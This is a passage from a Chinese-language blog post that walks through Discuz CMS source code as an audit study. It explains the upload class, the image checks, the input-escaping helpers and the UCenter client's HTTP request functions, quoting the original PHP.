class="string">'His'</span>).strtolower(random(<span class="number">16</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $filename;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="关于保存"><a href="#关于保存" class="headerlink" title="关于保存"></a>关于保存</h3><p>当前文件上传类下面一个save()函数用来存储上传的东西，这里还是直接用函数跟踪法好了。<br>追溯到save_to_local()这个函数，有两个参数，文件名和路径，在save()函数里面，参数$ignore的初始值是0，所以不会直接调用到save_to_local()这个函数，but还是追踪一下看看，save_to_local()里面有一个函数是is_upload_file()。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_upload_file</span><span class="params">($source)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $source &amp;&amp; ($source != <span class="string">'none'</span>) &amp;&amp; (is_uploaded_file($source) || is_uploaded_file(str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $source)));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>对上传的文件进行了判空和过滤操作，继续往下看，如果copy()函数调用成功，则表示保存成功，定义到copy函数的目录：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uc_server\<span class="class"><span class="keyword">lib</span>\<span class="title">upload</span>.<span class="title">class</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span><span class="params">($sourcefile, $destfile)</span> </span>&#123;</span><br><span class="line">		move_uploaded_file($sourcefile, $destfile);</span><br><span class="line">		@unlink($sourcefile);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>tips：PHP相关函数科普：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">move_uploaded_file</span><span class="params">()</span></span>：本函数检查并确保由 filename 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 destination 指定的文件。</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">unlink</span><span class="params">()</span></span>：删除 filename。和 Unix C 的 unlink() 函数相似。 发生错误时会产生一个 E_WARNING 级别的错误。所以使用的时候加了一个@符号来禁止报错。</span><br></pre></td></tr></table></figure></p>
<p>继续往下看save_to_local()下面的代码<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">elseif</span>(function_exists(<span class="string">'move_uploaded_file'</span>) &amp;&amp; <span class="variable">@move_uploaded_file</span>($source, $target))</span><br></pre></td></tr></table></figure></p>
<p>它通过判断是否存在move_uploaded_file函数和是否已经执行成功该函数来判断是否上传成功，继续往下推进。<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elseif (@is_readable($source) &amp;&amp; (@$fp_s = <span class="keyword">fopen</span>($source, <span class="string">'rb'</span>)) &amp;&amp; (@$fp_t = <span class="keyword">fopen</span>($target, <span class="string">'wb'</span>))) &#123;</span><br><span class="line">			<span class="keyword">while</span> (!<span class="keyword">feof</span>($fp_s)) &#123;</span><br><span class="line">				$s = @fread($fp_s, <span class="number">1024</span> * <span class="number">512</span>);</span><br><span class="line">				@fwrite($fp_t, $s);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">fclose</span>($fp_s); <span class="keyword">fclose</span>($fp_t);</span><br><span class="line">			$succeed = true;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>tips：PHP相关函数科普：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">is_readable</span><span class="params">()</span></span>:判断给定文件名是否存在并且可读。</span><br><span class="line"><span class="function"><span class="title">feof</span><span class="params">()</span></span>：测试文件指针是否到了文件结束的位置。</span><br><span class="line"><span class="function"><span class="title">fread</span><span class="params">()</span></span>：从文件指针 handle 读取最多 length 个字节。</span><br></pre></td></tr></table></figure></p>
<p>成功读写完毕后正常保存。<br>关于save()调用的类内定义函数，还有一个函数值得注意：get_image_info()。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_image_info</span><span class="params">($target, $allowswf = false)</span> </span>&#123;</span><br><span class="line">		$ext = discuz_upload::fileext($target);</span><br><span class="line">		$isimage = discuz_upload::is_image_ext($ext);</span><br><span class="line">		<span class="keyword">if</span>(!$isimage &amp;&amp; ($ext != <span class="string">'swf'</span> || !$allowswf)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(!is_readable($target)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>($imageinfo = @getimagesize($target)) &#123;</span><br><span class="line">			<span class="keyword">list</span>($width, $height, $type) = !<span class="keyword">empty</span>($imageinfo) ? $imageinfo : <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br><span class="line">			$size = $width * $height;</span><br><span class="line">			<span class="keyword">if</span>($size &gt; <span class="number">16777216</span> || $size &lt; <span class="number">16</span> ) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125; <span class="keyword">elseif</span>($ext == <span class="string">'swf'</span> &amp;&amp; $type != <span class="number">4</span> &amp;&amp; $type != <span class="number">13</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125; <span class="keyword">elseif</span>($isimage &amp;&amp; !in_array($type, <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">13</span>))) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125; <span class="keyword">elseif</span>(!$allowswf &amp;&amp; ($ext == <span class="string">'swf'</span> || $type == <span class="number">4</span> || $type == <span class="number">13</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $imageinfo;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>不是图像或者不可读直接false，继续往下看代码。<br>$imageinfo那里通过getimgaesize()函数来获取图像宽，高，类型等信息后，如果图像信息不为空，则使用list()来进行赋值，后面限制了图片的大小，后缀等等来判断上传。</p>
<h3 id="关于报错信息"><a href="#关于报错信息" class="headerlink" title="关于报错信息"></a>关于报错信息</h3><p>这个倒是很简单，两个类内定义的函数就搞定了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">error</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;errorcode;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">errormessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> lang(<span class="string">'error'</span>, <span class="string">'file_upload_error_'</span>.<span class="keyword">$this</span>-&gt;errorcode);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Discuz-function模块下的function-member-php文件"><a href="#Discuz-function模块下的function-member-php文件" class="headerlink" title="Discuz function模块下的function_member.php文件"></a>Discuz function模块下的function_member.php文件</h2><p>所以，还是从头开始分析…</p>
<h3 id="用户登录函数userlogin"><a href="#用户登录函数userlogin" class="headerlink" title="用户登录函数userlogin()"></a>用户登录函数userlogin()</h3><p>根据登录的位置来设定一个初始的isuid值，判断是否加载了uc_user_login这个函数，如果没有，就先加载function_core.php下的loaducenter()函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loaducenter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">require_once</span> DISCUZ_ROOT.<span class="string">'./config/config_ucenter.php'</span>;</span><br><span class="line">	<span class="keyword">require_once</span> DISCUZ_ROOT.<span class="string">'./uc_client/client.php'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先查看一下/config/目录和/uc_client/的两个PHP文件。<br>config_ucenter.php下是该CMS框架相关数据库信息，转回到client.php文件目录下，这个php文件有641行代码，我准备从这里开始过一下这个文件。</p>
<h4 id="uc-client-client-php"><a href="#uc-client-client-php" class="headerlink" title="/uc_client/client.php"></a>/uc_client/client.php</h4><h5 id="function-uc-addslashes"><a href="#function-uc-addslashes" class="headerlink" title="function uc_addslashes()"></a>function uc_addslashes()</h5><p>这是一个基于魔术引号过滤处理的函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_addslashes</span><span class="params">($string, $force = <span class="number">0</span>, $strip = FALSE)</span> </span>&#123;</span><br><span class="line">	!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line">	<span class="keyword">if</span>(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = uc_addslashes($val, $force, $strip);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$string = addslashes($strip ? stripslashes($string) : $string);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先对传入的变量进行相关判断，如果传入的参数是一个数组，则取出数组对应的值调用自身进行过滤，反之，则先直接去掉反斜杠，再调用addslashes()函数。</p>
<h5 id="function-dhtmlspecialchars"><a href="#function-dhtmlspecialchars" class="headerlink" title="function dhtmlspecialchars()"></a>function dhtmlspecialchars()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!function_exists(<span class="string">'dhtmlspecialchars'</span>)) &#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">dhtmlspecialchars</span><span class="params">($string, $flags = null)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_array($string)) &#123;</span><br><span class="line">			<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">				$string[$key] = dhtmlspecialchars($val, $flags);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>($flags === <span class="keyword">null</span>) &#123;</span><br><span class="line">				$string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>), $string);</span><br><span class="line">				<span class="keyword">if</span>(strpos($string, <span class="string">'&amp;amp;#'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">					$string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;));)/'</span>, <span class="string">'&amp;\\1'</span>, $string);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span>(PHP_VERSION &lt; <span class="string">'5.4.0'</span>) &#123;</span><br><span class="line">					$string = htmlspecialchars($string, $flags);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">if</span>(strtolower(CHARSET) == <span class="string">'utf-8'</span>) &#123;</span><br><span class="line">						$charset = <span class="string">'UTF-8'</span>;</span><br><span class="line">					&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">						$charset = <span class="string">'ISO-8859-1'</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					$string = htmlspecialchars($string, $flags, $charset);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $string;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基本操作和uc_addslashes()是一样的，根据是不是数组来进行第一次操作，然后把穿进来的字符串中的(‘&amp;’, ‘“‘, ‘&lt;’, ‘&gt;’)等替换成对应字符经过html编码后的版本。<br>继续推进，如果’&amp;#’在字符串中，则直接对字符串进行正则匹配，反之，如果PHP的版本低于5.4.0则直接调用内置htmlspecialchars()将相关字符转码为html实体。<br>如果PHP的版本高于5.4.0,则把字符串转化为UTF-8或者ISO-8859-1再调用htmlspecialchars()，最后返回成功过滤的$string。</p>
<h5 id="function-fsocketopen"><a href="#function-fsocketopen" class="headerlink" title="function fsocketopen()"></a>function fsocketopen()</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!function_exists(<span class="string">'fsocketopen'</span>)) &#123;</span><br><span class="line">	function fsocketopen($hostname, $port = <span class="number">80</span>, &amp;$errno, &amp;$errstr, $timeout = <span class="number">15</span>) &#123;</span><br><span class="line">		$fp = <span class="string">''</span><span class="comment">;</span></span><br><span class="line">		<span class="keyword">if</span>(function_exists(<span class="string">'fsockopen'</span>)) &#123;</span><br><span class="line">			$fp = <span class="symbol">@fsockopen</span>($hostname, $port, $errno, $errstr, $timeout)<span class="comment">;</span></span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'pfsockopen'</span>)) &#123;</span><br><span class="line">			$fp = <span class="symbol">@pfsockopen</span>($hostname, $port, $errno, $errstr, $timeout)<span class="comment">;</span></span><br><span class="line">		&#125; <span class="keyword">elseif</span>(function_exists(<span class="string">'stream_socket_client'</span>)) &#123;</span><br><span class="line">			$fp = <span class="symbol">@stream_socket_client</span>($hostname.<span class="string">':'</span>.$port, $errno, $errstr, $timeout)<span class="comment">;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $fp<span class="comment">;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一个文件函数，限制了端口，错误号，错误信息以及时延。</p>
<h5 id="function-uc-stripslashes"><a href="#function-uc-stripslashes" class="headerlink" title="function uc_stripslashes()"></a>function uc_stripslashes()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_stripslashes</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	!defined(<span class="string">'MAGIC_QUOTES_GPC'</span>) &amp;&amp; define(<span class="string">'MAGIC_QUOTES_GPC'</span>, get_magic_quotes_gpc());</span><br><span class="line">	<span class="keyword">if</span>(MAGIC_QUOTES_GPC) &#123;</span><br><span class="line">		<span class="keyword">return</span> stripslashes($string);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $string;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果开启了魔术引号，则去除转义的反斜杠。</p>
<h5 id="function-uc-api-post"><a href="#function-uc-api-post" class="headerlink" title="function uc_api_post()"></a>function uc_api_post()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_api_post</span><span class="params">($module, $action, $arg = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">	$s = $sep = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">foreach</span>($arg <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">		$k = urlencode($k);</span><br><span class="line">		<span class="keyword">if</span>(is_array($v)) &#123;</span><br><span class="line">			$s2 = $sep2 = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">foreach</span>($v <span class="keyword">as</span> $k2 =&gt; $v2) &#123;</span><br><span class="line">				$k2 = urlencode($k2);</span><br><span class="line">				$s2 .= <span class="string">"$sep2&#123;$k&#125;[$k2]="</span>.urlencode(uc_stripslashes($v2));</span><br><span class="line">				<span class="comment">//这里需要注意，&#123;$k&#125;外面的花括号是明确变量的意思，在这里其实就是$sep2和$k[$k2]合在一起。</span></span><br><span class="line">				$sep2 = <span class="string">'&amp;'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$s .= $sep.$s2;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$s .= <span class="string">"$sep$k="</span>.urlencode(uc_stripslashes($v));</span><br><span class="line">		&#125;</span><br><span class="line">		$sep = <span class="string">'&amp;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$postdata = uc_api_requestdata($module, $action, $s);</span><br><span class="line">	<span class="keyword">return</span> uc_fopen2(UC_API.<span class="string">'/index.php'</span>, <span class="number">500000</span>, $postdata, <span class="string">''</span>, <span class="keyword">TRUE</span>, UC_IP, <span class="number">20</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对函数进行功能分析，传入的参数$arg是一个数组，使用键值的方式对数组进行循环，如果键值里面还包含数组，键值对应的数组取出来，对该数组的单个值分别进行魔术引号判断过滤再进行url加密后拼接到$s2上，最后拼接到$s串上。<br>同时，如果不是键值对应的不是数组，则是直接进行魔术引号过滤后直接进行url加密。<br>字符串拼接完成后调用了uc_api_requestdata()后，追踪这个函数，在该函数的第一个语句又调用了另外一个函数，uc_api_input()，all right，继续跟踪这个函数，在进行url加密前却调用了另外一个函数：uc_authcode()，这个函数用来对传入的参数进行加密。<br>整个的函数调用关系如下：<br><img src="https://i.loli.net/2018/03/17/5aacdc6121cdb.png" alt=""><br>数据进行加密后重新返回原函数function uc_api_post()，返回值那里调用到了另外一个函数uc_fopen2()…</p>
<h5 id="function-uc-fopen2"><a href="#function-uc-fopen2" class="headerlink" title="function uc_fopen2()"></a>function uc_fopen2()</h5><p>函数里面有8个参数，url，限制，发送的数据，cookie，socket，ip，时限，模块这几个参数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_fopen2</span><span class="params">($url, $limit = <span class="number">0</span>, $post = <span class="string">''</span>, $cookie = <span class="string">''</span>, $bysocket = FALSE, $ip = <span class="string">''</span>, $timeout = <span class="number">15</span>, $block = TRUE)</span> </span>&#123;</span><br><span class="line">	$__times__ = <span class="keyword">isset</span>($_GET[<span class="string">'__times__'</span>]) ? intval($_GET[<span class="string">'__times__'</span>]) + <span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($__times__ &gt; <span class="number">2</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$url .= (strpos($url, <span class="string">'?'</span>) === <span class="keyword">FALSE</span> ? <span class="string">'?'</span> : <span class="string">'&amp;'</span>).<span class="string">"__times__=$__times__"</span>;</span><br><span class="line">	<span class="keyword">return</span> uc_fopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>判断是否通过GET方式获取了<strong>time</strong>的值，如果$<strong>time</strong>大于2，直接返回空，反之，根据是否在url后面有参数来添加这个参数<strong>time</strong>，然后调用uc_fopen()。</p>
<h5 id="function-uc-fopen"><a href="#function-uc-fopen" class="headerlink" title="function uc_fopen()"></a>function uc_fopen()</h5><p>这个函数的参数构造和uc_fopen2()的参数构造是一样的，直接看它的内容好了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uc_fopen</span><span class="params">($url, $limit = <span class="number">0</span>, $post = <span class="string">''</span>, $cookie = <span class="string">''</span>, $bysocket = FALSE, $ip = <span class="string">''</span>, $timeout = <span class="number">15</span>, $block = TRUE)</span> </span>&#123;</span><br><span class="line">	$return = <span class="string">''</span>;</span><br><span class="line">	$matches = parse_url($url);</span><br><span class="line">	!<span class="keyword">isset</span>($matches[<span class="string">'scheme'</span>]) &amp;&amp; $matches[<span class="string">'scheme'</span>] = <span class="string">''</span>;</span><br><span class="line">	!<span class="keyword">isset</span>($matches[<span class="string">'host'</span>]) &amp;&amp; $matches[<span class="string">'host'</span>] = <span class="string">''</span>;</span><br><span class="line">	!<span class="keyword">isset</span>($matches[<span class="string">'path'</span>]) &amp;&amp; $matches[<span class="string">'path'</span>] = <span class="string">''</span>;</span><br><span class="line">	!<span class="keyword">isset</span>($matches[<span class="string">'query'</span>]) &amp;&amp; $matches[<span class="string">'query'</span>] = <span class="string">''</span>;</span><br><span class="line">	!<span class="keyword">isset</span>($matches[<span class="string">'port'</span>]) &amp;&amp; $matches[<span class="string">'port'</span>] = <span class="string">''</span>;</span><br><span class="line">	$scheme = $matches[<span class="string">'scheme'</span>];</span><br><span class="line">	$host = $matches[<span class="string">'host'</span>];</span><br><span class="line">	$path = $matches[<span class="string">'path'</span>] ? $matches[<span class="string">'path'</span>].($matches[<span class="string">'query'</span>] ? <span class="string">'?'</span>.$matches[<span class="string">'query'</span>] : <span class="string">''</span>) : <span class="string">'/'</span>;</span><br><span class="line">	$port = !<span class="keyword">empty</span>($matches[<span class="string">'port'</span>]) ? $matches[<span class="string">'port'</span>] : <span class="number">80</span>;</span><br><span class="line">	<span class="keyword">if</span>($post) &#123;</span><br><span class="line">		$out = <span class="string">"POST $path HTTP/1.0\r\n"</span>;</span><br><span class="line">		$header = <span class="string">"Accept: */*\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">'Content-Length: '</span>.strlen($post).<span class="string">"\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Connection: Close\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Cache-Control: no-cache\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Cookie: $cookie\r\n\r\n"</span>;</span><br><span class="line">		$out .= $header.$post;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$out = <span class="string">"GET $path HTTP/1.0\r\n"</span>;</span><br><span class="line">		$header = <span class="string">"Accept: */*\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"User-Agent: $_SERVER[HTTP_USER_AGENT]\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Connection: Close\r\n"</span>;</span><br><span class="line">		$header .= <span class="string">"Cookie: $cookie\r\n\r\n"</span>;</span><br><span class="line">		$out .= $header;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$fpflag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(!$fp = @fsocketopen(($ip ? $ip : $host), $port, $errno, $errstr, $timeout)) &#123;</span><br><span class="line">		$context = <span class="keyword">array</span>(</span><br><span class="line">			<span class="string">'http'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">				<span class="string">'method'</span> =&gt; $post ? <span class="string">'POST'</span> : <span class="string">'GET'</span>,</span><br><span class="line">				<span class="string">'header'</span> =&gt; $header,</span><br><span class="line">				<span class="string">'content'</span> =&gt; $post,</span><br><span class="line">				<span class="string">'timeout'</span> =&gt; $timeout,</span><br><span class="line">			),</span><br><span class="line">		);</span><br><span class="line">		$context = stream_context_create($context);</span><br><span class="line">		$fp = 